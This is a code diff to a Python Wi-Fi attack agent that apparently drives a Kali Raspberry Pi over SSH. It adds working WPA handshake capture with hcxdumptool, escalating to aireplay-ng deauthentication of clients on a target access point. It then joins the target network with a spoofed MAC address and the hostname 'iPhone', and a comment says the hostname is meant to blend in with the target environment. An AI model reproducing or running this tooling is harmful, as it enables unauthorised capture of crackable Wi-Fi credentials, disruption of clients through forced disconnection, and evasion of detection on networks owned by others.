@@ -65,9 +65,12 @@ PI_HOST_ETH = "192.168.1.95"
 PI_HOTSPOT  = "192.168.4.1"
 PI_USER     = "kali"
 
+# Hostname used during network join to avoid broadcasting real device name
+# Change this per engagement to blend in with target environment
+SPOOF_HOSTNAME = "iPhone"
 
 # How long to wait for rcascan stdout before giving up
-SCAN_TIMEOUT_SECONDS = 60
+SCAN_TIMEOUT_SECONDS = 120
 
 # How long to wait for a PMKID capture before giving up
 CAPTURE_TIMEOUT_SECONDS = 90
@@ -490,21 +493,29 @@ class WiFiAgent(BaseAgent):
 
     def _capture_pmkid(self, bssid: str) -> bool:
         """
-        Capture a PMKID from the target AP via hcxdumptool.
+        Capture a PMKID or EAPOL handshake from the target AP.
 
-        Writes a BPF filter first so we only capture frames from the target BSSID 
+        Two-phase approach -- minimum footprint first, escalate only if needed:
 
-        Watches stdout for "P+" which hcxdumptool prints when a PMKID is
-        grabbed. Returns True if at least one PMKID was captured within
-        CAPTURE_TIMEOUT_SECONDS, False otherwise.
+        Phase 3a -- passive listen (30s, no packets transmitted)
+            Silent. Waits for AP to broadcast PMKID or a client to
+            naturally authenticate. Checks handshake completeness before
+            accepting -- incomplete handshakes produce false positive cracks.
+
+        Phase 3b -- active deauth (remaining timeout)
+            Only runs if Phase 3a yields nothing usable.
+            Opens two SSH channels on the same transport simultaneously:
+            one for hcxdumptool capture, one for aireplay-ng deauth.
+            Deauth forces a fresh complete M1-M4 handshake.
 
         Args:
             bssid: Target BSSID in xx:xx:xx:xx:xx:xx format.
         """
-        # BPF filter requires BSSID without colons
+        import socket as _socket
+
         bssid_no_colons = bssid.replace(":", "")
 
-        # Write BPF filter to Pi temp dir
+        # Write BPF filter -- target only frames from this BSSID
         bpf_command = (
             f"hcxdumptool --bpfc=\"wlan addr3 {bssid_no_colons}\" > /tmp/filter.bpf"
         )
@@ -515,64 +526,166 @@ class WiFiAgent(BaseAgent):
 
         if VERBOSE: print(f"[WiFiAgent] BPF filter written for {bssid}") #VERBOSE
 
-        # Clean up any leftover capture files from previous runs 
-        # hcxdumptool won't overwrite an existing file, and stale data
-        # from a prior target would corrupt the conversion output
-        self._ssh_run("sudo rm -f /tmp/capture.pcapng /tmp/capture.hc22000", timeout=5)
+        # Clean up stale capture files -- hcxdumptool won't overwrite existing files
+        self._ssh_run("sudo rm -f /tmp/capture.pcapng /tmp/capture.hc22000 /tmp/capture_check.hc22000", timeout=5)
         if VERBOSE: print(f"[WiFiAgent] Cleared stale capture files") #VERBOSE
 
-        # Start capture -- hcxdumptool v7 manages monitor mode internally,
+        # -----------------------------------------------------------------
+        # Phase 3a -- passive listen, no deauth
+        # -----------------------------------------------------------------
+        PASSIVE_TIMEOUT = 30
+        print(f"[WiFiAgent] Phase 3a -- passive listen ({PASSIVE_TIMEOUT}s, no packets transmitted)...") #NORMAL
 
-        # Start capture -- hcxdumptool v7 manages monitor mode internally,
-        # do not pre-set monitor mode on wlan1 before this call
-        capture_command = (
-            f"sudo timeout {CAPTURE_TIMEOUT_SECONDS} "
+        passive_command = (
+            f"sudo timeout {PASSIVE_TIMEOUT} "
             f"hcxdumptool -i wlan1 -w /tmp/capture.pcapng "
             f"--bpf=/tmp/filter.bpf --rds=2 "
-            f"--disable-deauthentication=0 2>&1"
+            f"--disable_disassociation 2>&1"
         )
 
-        print(f"[WiFiAgent] Capturing PMKID (up to {CAPTURE_TIMEOUT_SECONDS}s)...") #NORMAL
-
+        pmkid_found = False
         try:
             ssh = self._get_ssh()
             stdin, stdout, stderr = ssh.exec_command(
-                capture_command,
-                timeout=CAPTURE_TIMEOUT_SECONDS + 10
+                passive_command,
+                timeout=PASSIVE_TIMEOUT + 10
             )
-
-            # Read stdout line by line while capture runs.
-            # We're looking for "P+" which means a PMKID frame was grabbed.
-            # stdout is a channel file, readline() blocks until data arrives.
-            pmkid_found = False
             while True:
                 line = stdout.readline()
                 if not line:
-                    # Channel closed, timeout killed hcxdumptool
                     break
                 line = line.strip()
                 if DEBUG: print(f"[WiFiAgent] hcxdumptool: {line}") #DEBUG
                 if "P+" in line:
                     pmkid_found = True
-                    print(f"[WiFiAgent] PMKID captured!") #NORMAL
+                    print(f"[WiFiAgent] PMKID captured (passive)!") #NORMAL
                 elif "p+" in line.lower():
                     pmkid_found = True
-                    print(f"[WiFiAgent] EAPOL handshake captured!") #NORMAL
-                    # Don't break, let the timeout run out naturally so the
-                    # pcapng is flushed and closed cleanly before we convert it
+                    print(f"[WiFiAgent] EAPOL frames seen (passive)...") #NORMAL
 
             stdout.channel.recv_exit_status()
 
         except Exception as e:
-            print(f"[WiFiAgent] Capture command error: {e}") #NORMAL
+            print(f"[WiFiAgent] Passive capture error: {e}") #NORMAL
             return False
 
-        # Verify the capture file actually exists and has content.
-        # Even if we didn't see P+ in stdout, the file may contain usable
-        # EAPOL frames -- let conversion decide if there's anything hashcat can use.
+        # Check file size
+        exit_code, out, _ = self._ssh_run("stat -c%s /tmp/capture.pcapng 2>/dev/null")
+        passive_size = int(out.strip() or "0") if exit_code == 0 and out else 0
+
+        # Check handshake completeness -- WPA*02* indicates a usable complete
+        # handshake. WPA*01* alone is PMKID only and may produce false positives.
+        # Only accept passive capture if we have at least one complete handshake.
+        complete_handshakes = 0
+        if pmkid_found and passive_size > 0:
+            self._ssh_run(
+                "hcxpcapngtool -o /tmp/capture_check.hc22000 /tmp/capture.pcapng > /dev/null 2>&1",
+                timeout=30
+            )
+            _, hc_check, _ = self._ssh_run(
+                "grep -c 'WPA\\*02\\*' /tmp/capture_check.hc22000 2>/dev/null || echo 0",
+                timeout=10
+            )
+            try:
+                complete_handshakes = int(hc_check.strip() or "0")
+            except ValueError:
+                complete_handshakes = 0
+            if VERBOSE: print(f"[WiFiAgent] Complete handshakes in passive capture: {complete_handshakes}") #VERBOSE
+
+        if pmkid_found and passive_size > 0 and complete_handshakes > 0:
+            print(f"[WiFiAgent] Passive capture successful with complete handshake -- skipping deauth") #NORMAL
+            # Use the check file as the final capture since it's already converted
+            self._ssh_run("cp /tmp/capture_check.hc22000 /tmp/capture.hc22000", timeout=5)
+            return True
+        elif pmkid_found and passive_size > 0:
+            print(f"[WiFiAgent] Passive capture incomplete handshake -- escalating to active deauth") #NORMAL
+        else:
+            print(f"[WiFiAgent] Passive capture yielded nothing -- escalating to active deauth") #NORMAL
+
+        # -----------------------------------------------------------------
+        # Phase 3b -- active deauth + capture simultaneously
+        # Opens two channels on the same SSH transport:
+        #   Channel 1 -- hcxdumptool capture
+        #   Channel 2 -- aireplay-ng deauth (forces complete M1-M4 handshake)
+        # Deauth runs 5s after capture starts so hcxdumptool is fully
+        # initialized before we force client reconnection.
+        # -----------------------------------------------------------------
+        ACTIVE_TIMEOUT = CAPTURE_TIMEOUT_SECONDS - PASSIVE_TIMEOUT
+        print(f"[WiFiAgent] Phase 3b -- active deauth ({ACTIVE_TIMEOUT}s)...") #NORMAL
+
+        # Remove passive capture file so active phase starts fresh
+        self._ssh_run("sudo rm -f /tmp/capture.pcapng /tmp/capture_check.hc22000", timeout=5)
+
+        # Detect target channel -- needed to lock aireplay-ng to correct channel
+        # hcxdumptool manages its own channel internally, only aireplay-ng needs this
+        _, chan_out, _ = self._ssh_run(
+            f"sudo iw dev wlan1 scan 2>/dev/null | grep -A5 '{bssid}' | "
+            f"grep 'primary channel' | awk '{{print $3}}'",
+            timeout=20
+        )
+        target_channel = chan_out.strip() if chan_out.strip().isdigit() else "6"
+        if VERBOSE: print(f"[WiFiAgent] Target channel: {target_channel}") #VERBOSE
+
+        capture_cmd = (
+            f"sudo timeout {ACTIVE_TIMEOUT} "
+            f"hcxdumptool -i wlan1 -w /tmp/capture.pcapng "
+            f"--bpf=/tmp/filter.bpf --rds=2 2>&1"
+        )
+
+        # Deauth runs after 5s delay -- gives hcxdumptool time to initialize
+        # before we force clients to reconnect
+        deauth_cmd = (
+            f"sleep 5 && sudo iwconfig wlan1 channel {target_channel} 2>/dev/null; "
+            f"sudo aireplay-ng -0 5 -a {bssid} wlan1 2>&1"
+        )
+
+        pmkid_found = False
+        try:
+            transport = self._get_ssh().get_transport()
+
+            # Channel 1 -- hcxdumptool capture (primary, we read stdout)
+            cap_channel = transport.open_session()
+            cap_channel.exec_command(capture_cmd)
+
+            # Channel 2 -- aireplay-ng deauth (fire and forget)
+            deauth_channel = transport.open_session()
+            deauth_channel.exec_command(deauth_cmd)
+
+            # Read capture stdout line by line
+            cap_channel.settimeout(ACTIVE_TIMEOUT + 10)
+            while True:
+                try:
+                    line = cap_channel.makefile().readline()
+                    if not line:
+                        break
+                    line = line.strip()
+                    if DEBUG: print(f"[WiFiAgent] hcxdumptool: {line}") #DEBUG
+                    if "P+" in line:
+                        pmkid_found = True
+                        print(f"[WiFiAgent] PMKID captured (active)!") #NORMAL
+                    elif "p+" in line.lower():
+                        pmkid_found = True
+                        print(f"[WiFiAgent] EAPOL handshake captured (active)!") #NORMAL
+                except _socket.timeout:
+                    break
+
+            cap_channel.recv_exit_status()
+
+            if DEBUG:
+                deauth_out = deauth_channel.makefile().read()
+                print(f"[WiFiAgent] aireplay-ng: {deauth_out}") #DEBUG
+
+            deauth_channel.close()
+            cap_channel.close()
+
+        except Exception as e:
+            print(f"[WiFiAgent] Active capture error: {e}") #NORMAL
+            return False
+
+        # Verify final capture file has content
         exit_code, out, _ = self._ssh_run("stat -c%s /tmp/capture.pcapng 2>/dev/null")
         if exit_code != 0 or not out or int(out.strip() or "0") == 0:
-            print(f"[WiFiAgent] Capture file empty or missing on Pi") #NORMAL
+            print(f"[WiFiAgent] Capture file empty or missing after both phases") #NORMAL
             return False
 
         if VERBOSE: print(f"[WiFiAgent] Capture file size: {out.strip()} bytes") #VERBOSE
@@ -764,15 +877,49 @@ class WiFiAgent(BaseAgent):
         """
         interface = _get_active_interface() or "en0"
 
-        # Spoof MAC before joining (real MAC must never touch the target network)
+
+        # --- MAC spoofing ---
+        # Try explicit MAC spoof first. On macOS Sequoia, private WiFi address
+        # feature may block this -- if it fails, macOS is already randomizing
+        # the MAC per-network at the driver level, which is equivalent protection.
         original_mac, spoofed_mac = _spoof_mac_context(interface)
-        if not spoofed_mac:
-            print(f"[WiFiAgent] MAC spoofing failed -- your real MAC will be visible on the target network") #NORMAL
-            print(f"[WiFiAgent] Proceed anyway? (yes/no): ", end="") #NORMAL
-            answer = input().strip().lower()
-            if answer != "yes":
-                print(f"[WiFiAgent] Aborting join -- MAC spoof required") #NORMAL
-                return False
+        if spoofed_mac:
+            print(f"[WiFiAgent] MAC spoofed successfully") #NORMAL
+        else:
+            # Check if macOS private WiFi address is active (Sequoia+)
+            # If so, hardware MAC is already protected -- safe to proceed
+            ifconfig_mac = subprocess.run(
+                ["ifconfig", interface],
+                capture_output=True, text=True
+            ).stdout
+            hw_mac = subprocess.run(
+                ["networksetup", "-getmacaddress", interface],
+                capture_output=True, text=True
+            ).stdout.strip()
+
+            # If ifconfig MAC differs from hardware MAC, randomization is active
+            if hw_mac and hw_mac.split()[-1].lower() not in ifconfig_mac.lower():
+                print(f"[WiFiAgent] MAC spoof failed but macOS private WiFi address is active -- hardware MAC protected") #NORMAL
+            else:
+                print(f"[WiFiAgent] MAC spoofing failed -- your real MAC will be visible on the target network") #NORMAL
+                print(f"[WiFiAgent] Proceed anyway? (yes/no): ", end="") #NORMAL
+                answer = input().strip().lower()
+                if answer != "yes":
+                    print(f"[WiFiAgent] Aborting join -- MAC spoof required") #NORMAL
+                    return False
+
+        # --- Hostname spoofing ---
+        # macOS broadcasts hostname via mDNS immediately on network join
+        # Spoof to something generic before joining
+        original_hostname = subprocess.run(
+            ["scutil", "--get", "LocalHostName"],
+            capture_output=True, text=True
+        ).stdout.strip()
+
+        subprocess.run(["sudo", "scutil", "--set", "ComputerName", SPOOF_HOSTNAME], capture_output=True)
+        subprocess.run(["sudo", "scutil", "--set", "LocalHostName", SPOOF_HOSTNAME], capture_output=True)
+        if VERBOSE: print(f"[WiFiAgent] Hostname spoofed: {original_hostname} -> {SPOOF_HOSTNAME}") #VERBOSE
+
 
         try:
             # Remove stale preferred network entry if one exists.
@@ -822,9 +969,15 @@ class WiFiAgent(BaseAgent):
             return False
 
         finally:
-            # Restore MAC regardless of outcome, don't want to leave spoofed mac on
+            # Restore real MAC if we spoofed it
             if original_mac:
                 _restore_mac(interface, original_mac)
+            # Restore real hostname regardless of outcome
+            if original_hostname:
+                subprocess.run(["sudo", "scutil", "--set", "ComputerName", original_hostname], capture_output=True)
+                subprocess.run(["sudo", "scutil", "--set", "LocalHostName", original_hostname], capture_output=True)
+                if VERBOSE: print(f"[WiFiAgent] Hostname restored: {original_hostname}") #VERBOSE
+
 
     # -------------------------------------------------------------------------
     # Phase 8 -- populate ctx
